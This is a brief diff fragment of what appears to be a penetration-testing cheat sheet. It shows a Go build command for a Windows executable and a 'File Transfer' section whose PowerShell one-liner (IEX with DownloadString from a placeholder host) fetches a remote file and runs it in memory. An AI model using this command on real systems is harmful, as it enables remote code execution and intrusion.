@@ -25,7 +25,6 @@ func main() {
 GOOS=windows GOARCH=amd64 go build -o pleasesubscribe.exe pleasesubscribe.go
 ```
 #  🗃️ File Transfer
-### Windows
 ```bash
 # 1. IEX DownloadString (Execute in memory)
 IEX(New-Object Net.WebClient).DownloadString("http://$ip:$port/file")
